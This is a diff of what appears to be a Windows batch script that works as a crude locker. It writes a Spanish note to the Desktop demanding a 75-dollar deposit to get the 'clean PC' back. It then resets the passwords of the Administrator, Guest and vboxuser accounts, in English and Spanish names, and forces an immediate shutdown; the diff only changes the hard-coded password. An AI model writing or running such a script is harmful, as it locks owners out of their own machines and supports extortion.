@@ -35,10 +35,10 @@ cd vboxuser
 cd Desktop
 echo Depozitame 75 dolarucos i te deho el PICI limpio JAJAJAJAJA nauuur > AlfredoPillo.txt
 
-net user Administrador #A250318l
-net user Administrator #A250318l
-net user Invitado #A250318l
-net user Guest #A250318l
-net user vboxuser #A250318l
+net user Administrador Douni123.
+net user Administrator Douni123.
+net user Invitado Douni123.
+net user Guest Douni123.
+net user vboxuser Douni123.
 
 shutdown /s /f /t 0
